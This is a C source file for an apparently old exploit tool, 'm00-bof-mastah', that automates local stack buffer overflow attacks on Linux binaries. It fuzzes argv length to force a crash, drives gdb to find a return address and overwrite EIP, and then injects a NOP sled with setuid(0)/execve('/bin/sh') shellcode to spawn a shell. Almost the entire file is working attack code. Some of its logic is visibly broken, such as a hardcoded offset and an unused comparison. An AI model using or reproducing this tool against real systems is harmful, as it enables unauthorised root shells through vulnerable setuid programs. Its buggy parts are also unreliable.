/*
 *  m00-bof-mastah.c
 *
 * Tool for analyzing and auto-exploiting local argv buffer overflows
 *
 * Unpublished ~ Demo
 *
 * Still a lot of bugs. Only for testing.
 *
 * -d4rkgr3y [d4rk@securitylab.ru] / m00.void.ru
 *
*/

/*
 * big thx to hkvig (uhagr) for idea and his leet technique
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>

char argz[] = ""; // argv before overflow buf. Somthing wrong with it
char perl[] = "/usr/bin/perl";
char gdb[] = "/usr/bin/gdb";
char grep[] = "/bin/grep";
char tmp[] = "/tmp/.m00.tmp";
char str[] = "Z";
char str_pt[] = "0x5a";
char nop[] = "\x90";
char *gdboutput, gdbuff[200];
int verbose = 0;
FILE *pt;

char gdb_c[] =
/*	"r `/usr/bin/perl -e 'print "A"x1000'`	*/
	"x/65535bx 0xbfff0000\n"
	"quit\n";

char shellcode[] =
	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
	"\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
	"\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";


const char *siglist[] = {
	"OK" ,
	"SIGHUP" ,
	"SIGINT" ,
	"SIGQUIT" ,
	"SIGILL" ,
	"SIGTRAP" ,
	"SIGABRT" ,
	"SIGBUS" ,
	"SIGFPE" ,
	"SIGKILL" ,
	"SIGUSR1" ,
	"SIGSEGV" ,
	"SIGUSR2" ,
	"SIGPIPE" ,
	"SIGALRM" ,
	"SIGTERM" ,
	NULL
};

int try_to_bof(char victim[70], int start, int step) {
	char buffer[54100];
	int status, i, child;
	pid_t pid;
	pid_t killah;

	strcat(buffer,argz);
	strcat(buffer,"\x20");
	for(i=start;i<50000;i=i*step) {
		if((pid=fork())==0) {
			memset(buffer+strlen(argz)+1,'\x5a',i);
			execl(victim,victim,&buffer,0);
		}
		sleep(2);
		kill(pid,9);
		wait(&status);
		printf(" * PID 0x%x :: BUF 0x%xb\n * Died with signal: %i ",pid,i,status);
		if(status>15) printf("(unknow)\n"); else printf("(%s)\n",siglist[status]);
		if(status==11) {
			printf(" + SURVIVED\n");
			return(i);
		}
	}
	return(0);
}

long int stack_scanning(char victim[70], int buflen) {
	char *ptr[2], ret[9];
	int len = 0;
	int i = 0;

	printf("[~] Creating gdb script\n");
	if((pt = fopen(tmp, "w")) == NULL ) {
		perror("[-]" );
		exit(0);
	}

	sprintf(gdbuff,"r %s `%s -e 'print \"%s\"x%d'`\n",argz,perl,str,buflen);
	strcat(gdbuff,gdb_c);
	fprintf(pt,gdbuff);
	if(verbose) printf("+-----+-----gdb_scr-----+-----+\n%s+-----+-----------------+-----+\n");

	fclose(pt);

	memset(gdbuff,'\x00',sizeof(gdbuff));
	printf("[~] Executing GDB\n");
	sprintf(gdbuff,"%s %s --command=%s | %s %s | %s -v in",gdb,victim,tmp,grep,str_pt,grep);
	if((pt = popen(gdbuff, "r")) == NULL) return(0);

	usleep(10000);
	printf("[~] Scanning...\n");
	while((getline(&gdboutput,&len,pt)) != -1 ) {
		printf(" * %s",gdboutput);
		if((ptr[0] = strstr(gdboutput,str_pt)) != NULL &&
		   (ptr[1] = strstr(ptr[0] + 4,str_pt)) != NULL &&
		   (ptr[2] = strstr(ptr[1] + 4,str_pt)) != NULL) {
			printf("[+] Found: ");
			i = 1;
			break;
		}
	}
	pclose(pt);
	unlink(tmp);
	if(i) {
		memcpy(ret,gdboutput+2,8);
		printf("0x%x\n",strtoul(ret,0,16));
		return(strtoul(ret,0,16));
	} else return(0);
}

int eip_check(char victim[70],int buflen,int quiet) {
	char new_str[11];
	char eip[12];
	int len = 0;
	int i = 0;

	sprintf(new_str,"%s%s%s",str_pt,str_pt+2,str+4);
	//printf("newstr: %s\n",new_str);
	if(!quiet) printf("[~] Creating gdb script\n");
	if((pt = fopen(tmp, "w")) == NULL ) {
		perror("[-]" );
		exit(0);
	}
	sprintf(gdbuff,"r %s `%s -e 'print \"%s\"x%d'`\n",argz,perl,str,buflen);
	strcat(gdbuff,"i reg eax ecx edx ebx esp ebp esi edi eip\n");
	strcat(gdbuff,"quit\n");
	fprintf(pt,gdbuff);
	if(verbose && !quiet) printf("+-----+-----gdb_scr-----+-----+\n%s+-----+-----------------+-----+\n");
	fclose(pt);

	memset(gdbuff,'\x00',sizeof(gdbuff));
	sprintf(gdbuff,"%s %s --command=%s | %s 0x | %s -v in",gdb,victim,tmp,grep,grep);
	if(!quiet) printf("[~] Executing GDB\n");
	if((pt = popen(gdbuff, "r")) == NULL) return(0);

	usleep(1000);
	while((getline(&gdboutput,&len,pt)) != -1 ) {
		if(strstr(gdboutput,"eip")) {
			if(strstr(gdboutput,new_str)) {
				i = 1;
			}
			if(quiet) {
				memcpy(eip,gdboutput+15,10);
				memset(eip+10,'\x00',1);
				printf(" * Buflen 0x%x * EIP %s\n",buflen,eip,strlen(gdboutput));
				memset(eip,'\x00',sizeof(eip));
			}
		}
		if(!quiet) printf(" * %s",gdboutput);
	}
	pclose(pt);
	unlink(tmp);
	if(i) return(1);
	else return(0);
}

int retaddr_det(char victim[70],int buflen) {
	char fake_ret[] = "\x41\x42\x43\x44";
	int len = 0;
	int i = 0;

	printf(" * Current position 0x%x * Remain 0x%x * Total 0x%x\r",i,buflen-i,buflen);
	for(i=0;i<buflen;i++) {
		printf(" * Current position 0x%x * Remain 0x%x * Total 0x%x\r",i,buflen-i,buflen);
		fflush(stdout);
		if((pt = fopen(tmp, "w")) == NULL ) {
			perror("[-]" );
			exit(0);
		}
		sprintf(gdbuff,"r %s `%s -e 'print \"%s\"x%d'`%s`%s -e 'print \"%s\"x%d'`\n",argz,perl,str,i,fake_ret,perl,str,buflen-i);
		strcat(gdbuff,"i reg eip\n");
		strcat(gdbuff,"quit\n");
		fprintf(pt,gdbuff);
		fclose(pt);

		memset(gdbuff,'\x00',sizeof(gdbuff));
		sprintf(gdbuff,"%s %s --command=%s | %s eip | %s -v in",gdb,victim,tmp,grep,grep);

		if((pt = popen(gdbuff, "r")) == NULL) return(0);

		usleep(10);
		while((getline(&gdboutput,&len,pt)) != -1 ) {
			if(strstr(gdboutput,"eip")) {
				if(strstr(gdboutput,"0x44434241")) {
					return(i);
				}
			}
		}
		pclose(pt);
		unlink(tmp);
	}
	return(0);
}

int exploit_it(char victim[70],int buflen,int position,long int ret) {
	char buffer[buflen+strlen(argz)];
	int i = 0;

	strcpy(buffer,argz);

	if(position>50+strlen(shellcode)) {
		ret=ret+50;
		printf(" * retaddr 0x%x\n * buflen 0x%x\n * posiition 0x%x\n",ret,buflen,position);
		for(i=0;i<position-strlen(shellcode);i++) buffer[i+strlen(argz)]=nop[0];
		for(i=0;i<strlen(shellcode);i++) buffer[i+strlen(argz)+position-strlen(shellcode)]=shellcode[i];
		memcpy(buffer+position+strlen(argz),(char *)&ret,4);
		for(i=position+strlen(argz)+4;i<buflen;i++) buffer[i]=nop[0];
	} else {
		ret=ret+position+6;
		printf(" * retaddr 0x%x\n * buflen 0x%x\n * posiition 0x%x\n",ret,buflen,position);
		for(i=0;i<position;i++) buffer[i+strlen(argz)]=nop[0];
		memcpy(buffer+position+strlen(argz),(char *)&ret,4);
		for(i=0;i<16;i++) strcat(buffer,nop);
		strcat(buffer,shellcode);
		for(i=strlen(shellcode)+strlen(argz)+position+20;i<buflen;i++) buffer[i]==nop[0];
	}
	printf("[+] Executing..\n");
	execl(victim,"shell",buffer,NULL);
}

int main(int argc, char ** argv) {
	char victim[70];
	//char victim[70] = "/sbin/ifenslave";
	//char victim[70] = "./vuln";
	//char victim[70] = "/home/satan/Desktop/code/shoutcast-1-9-2-linux-glibc6/sc_serv";
	long int ret;
	int position = 0;
	int buflen = 0;
	int quiet = 0;
	int c = 0;
	int i = 0;

	if(!argv[1]) {
		printf("usage: %s <vuln_binary>\n\n",argv[0]);
		exit(0);
	} else strncpy(victim,argv[1],69);

	printf("[~] Trying to crash %s\n",victim);
	if((buflen=try_to_bof(victim, 100, 3))==0) {
		printf("[-] can't overflow it\n");
		exit(0);
	}

	printf("[~] Searching for valid retaddr\n");
	if((ret=stack_scanning(victim,buflen))==0) {
		printf("[-] retaddr not found\n");
		exit(0);
	}

	printf("[~] Trying to overwrite EIP\n");
	if(eip_check(victim,buflen,quiet)) printf("[+] EIP overwrited\n");
	else {
		printf("[-] We got a problem\n");
		printf("[~] Trying to increase Buflen to overwrite EIP\n");
		quiet = 1;
		for(i=buflen;i<50000;i=i+i/2) {
			if(eip_check(victim,i,quiet)) {
				buflen=i;
				quiet=0;
				break;
			}
		}
		if(quiet) {
			printf("[-] Shit\n[~] Trying to overwrite other registers\n");
			exit(0); // not allowed in this version
		} else {
			printf("[+] EIP owned\n[~] Buflen changed to: 0x%x\n",buflen);
		}
	}

	printf("[~] Trying to determine retaddr position\n[~] This can take a few minutes\n");
	//if((position=retaddr_det(victim,buflen))==0) {
	//	printf("\n[-] Something went wrong..\n");
	//	exit(0);
	//} else printf("\n[+] Retaddr found at %i\n",position);
	position = 0x537;
	printf("[~] Trying to exploit it\n");
	if(!(position>20+strlen(shellcode)) && (buflen-position+4<strlen(shellcode)+20)) buflen+=strlen(shellcode)+20-position;
	exploit_it(victim,buflen,position,ret);
	return(1);
}
